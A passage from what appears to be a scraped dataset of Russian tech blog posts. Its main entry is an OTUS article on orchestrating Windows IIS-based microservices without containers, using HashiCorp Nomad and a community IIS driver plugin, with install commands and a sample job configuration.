разработкой 6G — мнения и перспективы. Развитие стандарта 6G находится на ранних этапах. Обсудили мнения экспертов о том, как долго ждать первые коммерческие реализации и устройства. Можно ожидать, что дорожная карта во многом будет зависеть от регулирования в конкретных странах.Подешевле, пожалуйста — кто обязал интернет-провайдеров ввести доступные тарифы, и что из этого получилось. Обсудили новости из США: кто и зачем вводит жёсткую регуляцию цен для провайдеров. Так, в Нью-Йорке провайдеров вынудили снижать тарифы. Операторы ответили исками и угрозами свернуть бизнес.Еще один RTP — можно ли [и нужно ли] заменить HTTP . Говорим об экспериментальном протоколе. Рассказываем, что он может предложить новый протокол, который только начинает «обрастать» спецификацией, а также обсуждаем мнения сообщества.Перспективы 6G и системный подход к мобильным сетям — что почитать. Наша подборка материалов, посвященных 6G и архитектуре мобильных сетей. В списке книги, руководства, исследовательские работы и аналитические отчёты."
103,Микросервисы без контейнеров,OTUS,Цифровые навыки от ведущих экспертов,0,"Консалтинг и поддержка, Рекрутинг и HR, Производство мультимедиа-контента",2025-04-09,"Микросервисная архитектура у нас прочно ассоциируется с контейнерами и Linux. Однако, что делать, если у нас есть приложение на базе микросервисной архитектуры для Windows?Обычно все считают, что микросервисы — это только про контейнеры, поэтому они строят свои приложения на основе облачного подхода, чтобы они могли легко запускаться на любой платформе с использованием контейнеров. Конечно, контейнеризация — это достойный способ разработки облачного нативного приложения, особенно при интеграции его с такими оркестраторами, как Kubernetes. Она снимает с нас много накладных расходов, таких как: масштабирование, предотвращение отказов, развертывание и т. д., но это не означает, что микросервисами можно управлять только в контейнерной экосистеме. Микросервисы — это идеология или образ мышления при проектировании приложений, а контейнеризация — это средство, поддерживающее эту идеологию.Допустим, у нас есть приложением на базе.NET, которое может работать только на платформе Windows. Еще хуже, если у нас есть часть микросервисов, работающих под управлением Docker и несколько важных компонентов, работающих под.NET. Очевидно, мы могли бы использовать контейнеры Windows, но с ними слишком много различных «странностей». Другой способ — использовать статические виртуальные машины, но это будет в определенной степени пустая трата ресурсов. Решение NomadKubernetes — это система оркестровки, предназначенная для управления экосистемой контейнеров, но, мы хотели оркестровать процесс Windows (в основном процессы на базе веб‑сервера windows IIS). То есть можно сказать, что Nomad — это механизм оркестровки, который поддерживает не только контейнерные, но и виртуализированные и автономные приложения, включая Docker, Java, IIS на Windows и т. д.Nomad работает по модели, основанной на плагинах, в которой вы можете использовать существующие плагины, такие как Docker, Java, IIS, или написать собственный плагин, используя Golang‑SDK.Однако, Nomad не поддерживает веб‑сервер Windows IIS по умолчанию, для этого нам нужно установить плагин на клиентские узлы Nomad. Далее в статье будет рассматриваться использование плагина для IIS, разработанный Roblox Developers.Реализация с помощью NomadИмеющийся плагин для IIS также не имел все необходимые для эффективной оркестрации компоненты. Например, в нем отсутствовало ограничение ресурсов на IIS, переменные среды и некоторые другие нужные функции. При этом, базовые функции механизма оркестровки, такие как масштабирование, отказоустойчивость, мониторинг метрик и т. д. уже поддерживались Nomad, поэтому в целом он устраивал команду разработки, необходимо было только дополнить его функционал. В результате плагин был доработан и его можно загрузить по той ссылке.Основной замысел заключался в следующем, с помощью единого сервера Nomad мы сможем управлять как компонентами, работающими под управлением Docker, так и непосредственно процессами IIS. Установка NomadNomad можно установить как на Windows, так и на Linux. Установка на Windows проще в том плане, что для нее достаточно загрузить выполнимый файл.Далее необходимо либо прописать в переменной среды PATH путь к выполнимому файлу, либо поместить этот файл в один из каталогов, указанных в данной переменной: export PATH=/usr/local:/opt/bin:/opt/hashicorpТакже, под Windows можно использовать пакетный менеджер Chocolately:$ choco install nomadУбедиться в корректности настройки можно с помощью команды:$ nomad -vМы не будем подробно рассматривать настройку кластера Nomad и его взаимодействия с серверами Docker. При необходимости всю эту информацию можно найти на сайте Hashicorp.Мы перейдем к рассмотрению настроек взаимодействия с IIS. Здесь мы указываем IIS использовать для работы с Nomad представленный ранее драйвер: job ""iis-test"" {   datacenters = [""dc1""]   type = ""service""    group ""iis-test"" {     count = 1     restart {       attempts = 10       interval = ""5m""       delay = ""25s""       mode = ""delay""     }      task ""iis-test"" {       driver = ""win_iis""        artifact {         source = ""https://github.com/iamabhishek-dubey/nomad-driver-iis/releases/download/v0.4/test-hello-world.zip""       }        config {         path = ""${NOMAD_TASK_DIR}\\netcoreapp2.1""          apppool_identity {           identity = ""NetworkService""         }          bindings {           type = ""http""           resource_port = ""httplabel""         }       }        resources {         cpu    = 100         memory = 20         network {           port ""httplabel"" {}         }       }        service {         name = ""iis-test""         tags = [""iis-test"", ""windows-iis-test""]         port = ""httplabel""          check {           type = ""tcp""           interval = ""10s""           timeout = ""2s""         }       }     }   } }После завершения настройки задания для IIS мы можем создать его с помощью пользовательского интерфейса Nomad в нашем кластере.После того как мы увеличили количество приложений до 2, nomad запустил еще один процесс IIS для приложения. Теперь если мы попытаемся уничтожить один из процессов, Nomad тутже запустит новый процесс, аналогично Kubernetes.Таким образом мы получили возможность управлять процессами в веб сервере IIS с помощью средств оркестрации, аналогичных Kubernetes.ЗаключениеПодумав нестандартно, мы решили проблему и для приложений, не основанных на контейнерах, и добились возможности реализации некоторых базовых функций механизма оркестровки, таких как масштабирование, обеспечение отказоустойчивости и других для приложений на базе Windows.Целью данной статьи было показать, как можно решить проблему реализации микросервисной архитектуры для приложений, не поддерживающих контейнеризацию. Конечно, подобные ситуации возникают не так часто, и как правило уже при разработке решения закладывается возможность его использования в контейнеризированной среде. Но представленная в статье концепция позволяет использовать микросервисную архитектуру даже там, где нет контенейров.Таким образом, мы можем использовать микросервисную архитектуру без привязки к таким общепринятым решениям, как Docker и Kubernetes, тем самым расширяя возможности по применению данной архитектуры.Если тема микросервисов для вас не только теория, но и повседневная практика — приглашаем на открытые технические встречи, где разбираем ключевые архитектурные решения и подводные камни в продакшене.Темы ближайших уроков:10 апреля — Выбираем способ связи между микросервисами: Sync vs Async17 апреля — Performance Testing в микросервисах. Как избежать коллапса под нагрузкой?"
